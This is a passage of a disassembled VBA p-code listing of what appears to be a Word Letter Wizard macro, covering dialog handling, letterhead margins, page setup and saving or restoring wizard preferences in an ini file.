(Private Sub UpdateHeadingPosition())\n' Line #1073:\n' \tDim \n' \tVarDefn lhpNew\n' Line #1074:\n' \tDim \n' \tVarDefn L\n' Line #1075:\n' \tDim \n' \tVarDefn R\n' Line #1076:\n' \tDim \n' \tVarDefn T\n' Line #1077:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt lhpNew \n' Line #1078:\n' \tLd lhpNew \n' \tLd gCurrentHeadingPosition \n' \tNe \n' \tIfBlock \n' Line #1079:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #1080:\n' \tLd lhpNew \n' \tSt gCurrentHeadingPosition \n' Line #1081:\n' \tLd pt90_$ \n' \tSt L$ \n' \tBoS 0x0000 \n' \tLd pt90_$ \n' \tSt R$ \n' \tBoS 0x0000 \n' \tLd pt72_$ \n' \tSt T$ \n' Line #1082:\n' \tLd gCurrentHeadingPosition \n' \tSelectCase \n' Line #1083:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tLd pt216_$ \n' \tSt T$ \n' Line #1084:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tLd pt216_$ \n' \tSt L$ \n' Line #1085:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tLd pt216_$ \n' \tSt R$ \n' Line #1086:\n' \tEndSelect \n' Line #1087:\n' \tLd T$ \n' \tParamNamed TopMargin \n' \tLd L$ \n' \tParamNamed LeftMargin \n' \tLd R$ \n' \tParamNamed RightMargin \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0003 \n' Line #1088:\n' \tArgsCall PickStylePreview 0x0000 \n' Line #1089:\n' \tEndIfBlock \n' Line #1090:\n' \tEndSub \n' Line #1091:\n' Line #1092:\n' \tQuoteRem 0x0000 0x0051 \"%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)\"\n' Line #1093:\n' \tFuncDefn (Private Function DoButtonClick(id, item))\n' Line #1094:\n' \tDim \n' \tVarDefn ret\n' Line #1095:\n' \tDim \n' \tVarDefn letterIndex\n' Line #1096:\n' \tDim \n' \tVarDefn fname\n' Line #1097:\n' \tDim \n' \tVarDefn x\n' Line #1098:\n' \tLitDI2 0x0000 \n' \tSt ret \n' \tQuoteRem 0x000C 0x0042 \"Change value of ret when we override standard buttons (eg, \"Next\")\"\n' Line #1099:\n' \tQuoteRem 0x0004 0x0017 \"Note: item 6 is \"Next>\"\"\n' Line #1100:\n' Line #1101:\n' \tLd State \n' \tLitDI2 0x0003 \n' \tEq \n' \tLd item \n' \tLitDI2 0x0000 \n' \tArgsLd StateItems__ 0x0001 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #1102:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #1103:\n' \tLitDI2 0x0045 \n' \tUMi \n' \tSt gCurrentHeadingPosition \n' \tQuoteRem 0x002A 0x000C \"force change\"\n' Line #1104:\n' \tArgsCall UpdateHeadingPosition 0x0000 \n' Line #1105:\n' \tElseBlock \n' Line #1106:\n' \tLd pt72_$ \n' \tParamNamed TopMargin \n' \tLd pt90_$ \n' \tParamNamed LeftMargin \n' \tLd pt90_$ \n' \tParamNamed RightMargin \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0003 \n' Line #1107:\n' \tArgsCall PickStylePreview 0x0000 \n' \tQuoteRem 0x001D 0x0004 \"TEST\"\n' Line #1108:\n' \tEndIfBlock \n' Line #1109:\n' \tLd WordBasic \n' \tArgsMemCall DlgUpdateFilePreview 0x0000 \n' Line #1110:\n' \tEndIfBlock \n' Line #1111:\n' \tLd State \n' \tLitDI2 0x0004 \n' \tEq \n' \tLd item \n' \tLitDI2 0x0000 \n' \tArgsLd StateItems__ 0x0001 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #1112:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLd gCurrentHeadingPosition \n' \tNe \n' \tIfBlock \n' Line #1113:\n' \tArgsCall UpdateHeadingPosition 0x0000 \n' Line #1114:\n' \tLd WordBasic \n' \tArgsMemCall DlgUpdateFilePreview 0x0000 \n' Line #1115:\n' \tEndIfBlock \n' Line #1116:\n' \tEndIfBlock \n' Line #1117:\n' \tLd State \n' \tLitDI2 0x0005 \n' \tEq \n' \tIfBlock \n' Line #1118:\n' \tArgsCall ParseRetAddress 0x0000 \n' Line #1119:\n' \tLd RetAddressLines \n' \tLitDI2 0x0005 \n' \tGt \n' \tIfBlock \n' Line #1120:\n' \tLitDI2 0x0002 \n' \tSt ret \n' Line #1121:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' Line #1122:\n' \tLd kErrMaxLines$ \n' \tLitDI2 0x0030 \n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0002 \n' Line #1123:\n' \tEndIfBlock \n' \tQuoteRem 0x000F 0x000D \"retaddress...\"\n' Line #1124:\n' \tEndIfBlock \n' \tQuoteRem 0x000B 0x0009 \"state = 5\"\n' Line #1125:\n' \tLd State \n' \tLitDI2 0x0006 \n' \tEq \n' \tLd item \n' \tLitDI2 0x0000 \n' \tArgsLd StateItems__ 0x0001 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #1126:\n' \tArgsCall PickStylePreview 0x0000 \n' Line #1127:\n' \tLd WordBasic \n' \tArgsMemCall DlgUpdateFilePreview 0x0000 \n' Line #1128:\n' \tEndIfBlock \n' Line #1129:\n' \tLabel LContinue \n' Line #1130:\n' \tLd item \n' \tLitDI2 0x0007 \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0015 0x0007 \" FINISH\"\n' Line #1131:\n' \tLd RetAddressLines \n' \tLitDI2 0x0005 \n' \tLe \n' \tIfBlock \n' Line #1132:\n' \tArgsCall CreateLetter 0x0000 \n' Line #1133:\n' \tLitStr 0x000E \"HelpOrEnvelope\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt x \n' Line #1134:\n' \tLd x \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tSt gEnvelopeLabel \n' Line #1135:\n' \tLd dlgEL \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall ToolsEnvelopesAndLabels 0x0001 \n' Line #1136:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tLd dlgEL \n' \tMemSt EnvAddress \n' Line #1137:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tLd dlgEL \n' \tMemSt EnvReturn \n' Line #1138:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tLd dlgEL \n' \tMemSt AddrText \n' Line #1139:\n' \tLitDI2 0x0000 \n' \tLd dlgEL \n' \tMemSt ExtractAddress \n' Line #1140:\n' \tLitDI2 0x0001 \n' \tSt ret \n' \tQuoteRem 0x0014 0x0024 \" This means \"return from wizard now\"\"\n' Line #1141:\n' \tElseBlock \n' Line #1142:\n' \tLitDI2 0x0002 \n' \tSt ret \n' Line #1143:\n' \tEndIfBlock \n' Line #1144:\n' \tEndIfBlock \n' Line #1145:\n' \tLd ret \n' \tSt DoButtonClick \n' Line #1146:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x000D \"DoButtonClick\"\n' Line #1147:\n' Line #1148:\n' Line #1149:\n' \tFuncDefn (Private Sub ItemFocusChanged(id, wold))\n' Line #1150:\n' \tLd State \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #1151:\n' \tLd id$ \n' \tLitDI2 0x0005 \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tLitStr 0x0005 \"optlm\"\n' \tEq \n' \tIfBlock \n' Line #1152:\n' \tLitStr 0x0008 \"tip1text\"\n' \tLitStr 0x0004 \"tip1\"\n' \tLd id$ \n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #1153:\n' \tEndIfBlock \n' Line #1154:\n' \tLd State \n' \tLitDI2 0x0004 \n' \tEq \n' \tElseIfBlock \n' Line #1155:\n' \tLd id$ \n' \tLitDI2 0x0003 \n' \tLitDI2 0x0003 \n' \tArgsLd Mid$ 0x0003 \n' \tLitStr 0x0003 \"The\"\n' \tEq \n' \tIfBlock \n' Line #1156:\n' \tLitStr 0x0008 \"tip5text\"\n' \tLitStr 0x0004 \"tip5\"\n' \tLd id$ \n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #1157:\n' \tEndIfBlock \n' Line #1158:\n' \tEndIfBlock \n' Line #1159:\n' \tEndSub \n' Line #1160:\n' Line #1161:\n' \tFuncDefn (Private Sub SaveDialog())\n' Line #1162:\n' \tLd kSaveSettings$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #1163:\n' \tLitStr 0x000C \"LetterMethod\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1164:\n' \tQuoteRem 0x0000 0x0007 \"state 2\"\n' Line #1165:\n' \tLitStr 0x0009 \"chkloPage\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1166:\n' \tLitStr 0x0009 \"chkloDate\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1167:\n' \tLitStr 0x0007 \"chkloID\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1168:\n' \tLitStr 0x0013 \"chkloWriterInitials\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1169:\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1170:\n' \tLitStr 0x0007 \"chkloCC\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1171:\n' \tLitStr 0x000F \"chkloEnclosures\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1172:\n' \tLitStr 0x0010 \"chkloAttachments\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1173:\n' \tQuoteRem 0x0000 0x0001 \"3\"\n' Line #1174:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1175:\n' \tQuoteRem 0x0000 0x0001 \"4\"\n' Line #1176:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1177:\n' \tLitStr 0x0013 \"textLetterheadSpace\"\n' \tArgsCall SaveDlgPref 0x0001 \n' Line #1178:\n' \tQuoteRem 0x0000 0x0001 \"5\"\n' Line #1179:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tArgsCall SaveDlgMultiLinePref 0x0001 \n' Line #1180:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tArgsCall SaveDlgMultiLinePref 0x0001 \n' Line #1181:\n' \tQuoteRem 0x0000 0x0001 \"6\"\n' Line #1182:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1183:\n' \tQuoteRem 0x0000 0x0006 \"finish\"\n' Line #1184:\n' \tLitStr 0x000E \"HelpOrEnvelope\"\n' \tArgsCall SaveDlgValPref 0x0001 \n' Line #1185:\n' \tEndSub \n' Line #1186:\n' Line #1187:\n' \tFuncDefn (Private Sub RstDialog())\n' Line #1188:\n' \tDim \n' \tVarDefn a\n' Line #1189:\n' \tDim \n' \tVarDefn unit\n' Line #1190:\n' \tDim \n' \tVarDefn kRstStylesheet\n' Line #1191:\n' \tDim \n' \tVarDefn def\n' Line #1192:\n' \tLd kRstSettings$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #1193:\n' \tLitStr 0x000C \"LetterMethod\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' \tQuoteRem 0x0024 0x0017 \" LetterMethod is id #11\"\n' Line #1194:\n' \tLitStr 0x0008 \"tip1text\"\n' \tLitStr 0x0009 \"tip1optlm\"\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' \tQuoteRem 0x0081 0x0016 \"For Prewritten Letters\"\n' Line #1195:\n' \tQuoteRem 0x0000 0x0007 \"state 2\"\n' Line #1196:\n' \tLitStr 0x0009 \"chkloPage\"\n' \tLitDI2 0x0001 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1197:\n' \tLitStr 0x0009 \"chkloDate\"\n' \tLitDI2 0x0001 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1198:\n' \tLitStr 0x0007 \"chkloID\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1199:\n' \tLitStr 0x0013 \"chkloWriterInitials\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1200:\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1201:\n' \tLitStr 0x0007 \"chkloCC\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1202:\n' \tLitStr 0x000F \"chkloEnclosures\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1203:\n' \tLitStr 0x0010 \"chkloAttachments\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1204:\n' \tQuoteRem 0x0000 0x0001 \"3\"\n' Line #1205:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLitDI2 0x0001 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1206:\n' \tQuoteRem 0x0000 0x0001 \"4\"\n' Line #1207:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1208:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt gCurrentHeadingPosition \n' Line #1209:\n' \tLitDI2 0x0004 \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd StateItems__ 0x0001 \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSelectCase \n' \tQuoteRem 0x003C 0x0012 \"LetterHeadPosition\"\n' Line #1210:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' Line #1211:\n' \tLitStr 0x0008 \"AtTheTop\"\n' \tSt a$ \n' Line #1212:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #1213:\n' \tLitStr 0x0009 \"OnTheLeft\"\n' \tSt a$ \n' Line #1214:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #1215:\n' \tLitStr 0x000A \"OnTheRight\"\n' \tSt a$ \n' Line #1216:\n' \tCaseElse \n' Line #1217:\n' \tLitStr 0x0018 \"Internal error (LHP bad)\"\n' \tLd wizname$ \n' \tLitDI2 0x0010 \n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0003 \n' Line #1218:\n' \tEndSelect \n' Line #1219:\n' \tLitStr 0x0008 \"tip5text\"\n' \tLitStr 0x0004 \"tip5\"\n' \tLd a$ \n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #1220:\n' \tLd GetDefaultUnits \n' \tSt unit \n' Line #1221:\n' \tLitStr 0x0013 \"textLetterheadSpace\"\n' \tLitDI2 0x0002 \n' \tLd unit \n' \tArgsLd ConvertInchesToUnits 0x0002 \n' \tLd unit \n' \tArgsLd PrettyMeasurement$ 0x0002 \n' \tArgsCall RstDlgPref 0x0002 \n' Line #1222:\n' \tQuoteRem 0x0000 0x0001 \"5\"\n' Line #1223:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLitStr 0x0014 \"prefRecipientAddress\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tArgsCall RstDlgMultiLinePref 0x0002 \n' Line #1224:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd toui \n' \tMemLd Address \n' \tArgsCall RstDlgMultiLinePref 0x0002 \n' Line #1225:\n' \tQuoteRem 0x0000 0x0001 \"6\"\n' Line #1226:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLitDI2 0x0000 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1227:\n' \tQuoteRem 0x0000 0x0006 \"finish\"\n' Line #1228:\n' \tLitStr 0x000E \"HelpOrEnvelope\"\n' \tLitDI2 0x0001 \n' \tArgsCall RstDlgValPref 0x0002 \n' Line #1229:\n' \tArgsCall PickStylePreview 0x0000 \n' Line #1230:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tArgsCall UpdateHeadingPosition 0x0000 \n' \tEndIf \n' Line #1231:\n' \tLd kRstStylesheet$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #1232:\n' \tQuoteRem 0x0000 0x0026 \"======================================\"\n' Line #1233:\n' \tLitStr 0x000A \"LetterName\"\n' \tLd WordBasic \n' \tArgsMemLd [GetDocumentVar$] 0x0001 \n' \tSt def$ \n' Line #1234:\n' \tLd def$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' \tQuoteRem 0x001C 0x003B \"oh, goody: Mr. Resume is bossing me around again. Joy, joy.\"\n' Line #1235:\n' \tLd kLookingFor$ \n' \tLd chQuote$ \n' \tAdd \n' \tLd def$ \n' \tAdd \n' \tLd chQuote$ \n' \tAdd \n' \tLitStr 0x0003 \"...\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #1236:\n' \tLitStr 0x000C \"LetterMethod\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgValue 0x0002 \n' \tQuoteRem 0x0030 0x000A \"prewritten\"\n' Line #1237:\n' \tLitStr 0x0008 \"tip1text\"\n' \tLitStr 0x0009 \"tip1optlm\"\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAutoText$] 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' \tQuoteRem 0x0085 0x0016 \"For Prewritten Letters\"\n' Line #1238:\n' \tEndIfBlock \n' Line #1239:\n' \tLitStr 0x0000 \"\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #1240:\n' \tEndSub \n' Line #1241:\n' Line #1242:\n' \tQuoteRem 0x0000 0x0036 \"======================================================\"\n' Line #1243:\n' \tQuoteRem 0x0000 0x0019 \"%% Common Wizard Routines\"\n' Line #1244:\n' Line #1245:\n' \tFuncDefn (Private Sub VerifyEnvirons())\n' Line #1246:\n' \tDim \n' \tVarDefn wind\n' Line #1247:\n' \tDim \n' \tVarDefn fBadDoc\n' Line #1248:\n' \tDim \n' \tVarDefn howser (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd ToolsOptionsGeneral 0x0001 \n' \tSet howser \n' Line #1249:\n' \tLd howser \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall ToolsOptionsGeneral 0x0001 \n' Line #1250:\n' \tLd howser \n' \tMemLd BlueScreen \n' \tSt gDoogie \n' Line #1251:\n' \tLitDI2 0x0000 \n' \tParamNamed BlueScreen \n' \tLd WordBasic \n' \tArgsMemCall ToolsOptionsGeneral 0x0001 \n' Line #1252:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall ScreenUpdating 0x0001 \n' Line #1253:\n' \tLd WordBasic \n' \tArgsMemCall DisableInput 0x0000 \n' \tQuoteRem 0x001C 0x002A \"Disable ESCape (works correctly in dialog)\"\n' Line #1254:\n' \tLd WordBasic \n' \tArgsMemLd [FileNameFromWindow$] 0x0000 \n' \tSt wind$ \n' Line #1255:\n' \tLd wind$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tSt fBadDoc \n' \tEndIf \n' Line #1256:\n' \tLd WordBasic \n' \tArgsMemLd IsMacro 0x0000 \n' \tLd wind$ \n' \tLitStr 0x0001 \".\"\n' \tFnInStr \n' \tLitDI2 0x0000 \n' \tNe \n' \tOr \n' \tIfBlock \n' Line #1257:\n' \tLitDI2 0x0001 \n' \tSt fBadDoc \n' Line #1258:\n' \tElseBlock \n' Line #1259:\n' \tLd WordBasic \n' \tArgsMemCall EditSelectAll 0x0000 \n' Line #1260:\n' \tLd WordBasic \n' \tArgsMemLd [Selection$] 0x0000 \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tSt fBadDoc \n' \tEndIf \n' Line #1261:\n' \tEndIfBlock \n' Line #1262:\n' \tLd fBadDoc \n' \tIfBlock \n' Line #1263:\n' \tLd kErrBadDoc$ \n' \tLd kWizname$ \n' \tLitDI2 0x0010 \n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0003 \n' Line #1264:\n' \tLitDI2 0x0516 \n' \tError \n' Line #1265:\n' \tEndIfBlock \n' Line #1266:\n' \tQuoteRem 0x0000 0x0055 \"After all that, the document may still be bogus (even if we created a new one above!)\"\n' Line #1267:\n' \tLd WordBasic \n' \tArgsMemCall EditSelectAll 0x0000 \n' \tQuoteRem 0x001C 0x000C \"Clear it out\"\n' Line #1268:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #1269:\n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0000 \n' \tSt workDoc$ \n' \tQuoteRem 0x002C 0x0020 \"get name of working doc's window\"\n' Line #1270:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall DisableAutoMacros 0x0001 \n' \tQuoteRem 0x0028 0x0021 \"make sure no macros are executed!\"\n' Line #1271:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError FatalError \n' Line #1272:\n' \tLd WordBasic \n' \tArgsMemCall FileNewDefault 0x0000 \n' \tQuoteRem 0x0028 0x001A \"create a new, empty window\"\n' Line #1273:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DisableAutoMacros 0x0001 \n' \tQuoteRem 0x0028 0x0015 \"re-enable auto macros\"\n' Line #1274:\n' \tQuoteRem 0x0000 0x0017 \"grab page setup options\"\n' Line #1275:\n' \tDim \n' \tVarDefn dlgPgSetup1 (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FilePageSetup 0x0001 \n' \tSet dlgPgSetup1 \n' Line #1276:\n' \tDim \n' \tVarDefn dlgPgSetup2 (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FilePageSetup 0x0001 \n' \tSet dlgPgSetup2 \n' Line #1277:\n' \tLd dlgPgSetup1 \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #1278:\n' \tLd WordBasic \n' \tArgsMemLd Window 0x0000 \n' \tSt iEmptyDoc \n' \tQuoteRem 0x0028 0x0018 \"get window # of this doc\"\n' Line #1279:\n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0000 \n' \tSt emptyDoc$ \n' Line #1280:\n' \tLitDI2 0x0001 \n' \tSt iWorkDoc \n' Line #1281:\n' \tLd iWorkDoc \n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0001 \n' \tLd workDoc$ \n' \tNe \n' \tParen \n' \tWhile \n' \tQuoteRem 0x003A 0x0018 \"find our original window\"\n' Line #1282:\n' \tLd iWorkDoc \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt iWorkDoc \n' Line #1283:\n' \tWend \n' Line #1284:\n' \tLd iWorkDoc \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' \tQuoteRem 0x0028 0x001A \"switch back to working doc\"\n' Line #1285:\n' \tLd dlgPgSetup2 \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #1286:\n' \tLd dlgPgSetup1 \n' \tMemLd Orientation \n' \tLd dlgPgSetup2 \n' \tMemLd Orientation \n' \tNe \n' \tIfBlock \n' \tQuoteRem 0x003F 0x001C \"need to swap page dimensions\"\n' Line #1287:\n' \tStartWithExpr \n' \tLd ActiveDocument \n' \tMemLd PageSetup \n' \tWith \n' Line #1288:\n' \tLd dlgPgSetup1 \n' \tMemLd PageHeight \n' \tArgsLd Val 0x0001 \n' \tArgsLd CentimetersToPoints 0x0001 \n' \tMemStWith PageWidth \n' Line #1289:\n' \tLd dlgPgSetup1 \n' \tMemLd PageWidth \n' \tArgsLd Val 0x0001 \n' \tArgsLd CentimetersToPoints 0x0001 \n' \tMemStWith PageHeight \n' Line #1290:\n' \tEndWith \n' Line #1291:\n' \tElseBlock \n' Line #1292:\n' \tStartWithExpr \n' \tLd ActiveDocument \n' \tMemLd PageSetup \n' \tWith \n' Line #1293:\n' \tLd dlgPgSetup1 \n' \tMemLd PageWidth \n' \tArgsLd Val 0x0001 \n' \tArgsLd CentimetersToPoints 0x0001 \n' \tMemStWith PageWidth \n' Line #1294:\n' \tLd dlgPgSetup1 \n' \tMemLd PageHeight \n' \tArgsLd Val 0x0001 \n' \tArgsLd CentimetersToPoints 0x0001 \n' \tMemStWith PageHeight \n' Line #1295:\n' \tEndWith \n' Line #1296:\n' \tEndIfBlock \n' Line #1297:\n' \tGoTo NoError \n' Line #1298:\n' Line #1299:\n' \tLabel FatalError \n' Line #1300:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DisableAutoMacros 0x0001 \n' Line #1301:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError (GoTo 0) \n' Line #1302:\n' Line #1303:\n' \tLabel NoError \n' Line #1304:\n' Line #1305:\n' \tEndSub \n' Line #1306:\n' Line #1307:\n' \tQuoteRem 0x0000 0x0025 \"=====================================\"\n' Line #1308:\n' Line #1309:\n' \tFuncDefn (Private Sub xStorePref(id, val_))\n' Line #1310:\n' \tDim \n' \tVarDefn v\n' Line #1311:\n' \tLd val_$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \"~\"\n' \tSt v$ \n' \tElse \n' \tBoSImplicit \n' \tLd val_$ \n' \tSt v$ \n' \tEndIf \n' Line #1312:\n' \tLd kWizname$ \n' \tLd id$ \n' \tLd v$ \n' \tLitStr 0x0006 \"windir\"\n' \tArgsLd Environ 0x0001 \n' \tLitStr 0x000C \"\\wordwiz.ini\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall SetPrivateProfileString 0x0004 \n' Line #1313:\n' \tEndSub \n' Line #1314:\n' Line #1315:\n' \tFuncDefn (Private Function xFetchPref(id))\n' Line #1316:\n' \tLd kWizname$ \n' \tLd id$ \n' \tLitStr 0x0006 \"windir\"\n' \tArgsLd Environ 0x0001 \n' \tLitStr 0x000C \"\\wordwiz.ini\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemLd [GetPrivateProfileString$] 0x0003 \n' \tSt xFetchPref$ \n' Line #1317:\n' \tEndFunc \n' Line #1318:\n' Line #1319:\n' \tFuncDefn (Private Sub SaveDlgValPref(id))\n' Line #1320:\n' \tLd id$ \n' \tLitDI2 0x0001 \n' \tLd id$ \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tAdd \n' \tArgsLd Str 0x0001 \n' \tArgsCall xStorePref 0x0002 \n' Line #1321:\n' \tEndSub \n' Line #1322:\n' Line #1323:\n' \tFuncDefn (Private Sub RstDlgValPref(id, defaultVal))\n' Line #1324:\n' 